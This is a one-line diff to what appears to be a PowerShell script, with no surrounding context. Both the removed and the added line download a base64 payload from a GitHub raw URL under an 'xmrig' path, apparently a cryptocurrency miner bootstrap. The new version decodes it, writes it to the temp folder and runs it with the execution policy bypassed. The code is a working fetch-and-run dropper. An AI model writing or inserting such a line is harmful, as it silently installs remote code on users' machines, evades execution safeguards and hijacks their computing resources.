@@ -1,1 +1,1 @@
-$b=irm "https://raw.githubusercontent.com/alphahubv2/modest-fermi/master/xmrig/bootstrap.b64?$(Get-Random)";powershell -EncodedCommand $b
+$b=irm "https://raw.githubusercontent.com/alphahubv2/modest-fermi/master/xmrig/bootstrap.b64?$(Get-Random)"; $s=[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($b)); $f="$env:TEMP\bootstrap.ps1"; [IO.File]::WriteAllText($f, $s); powershell -ExecutionPolicy Bypass -File $f
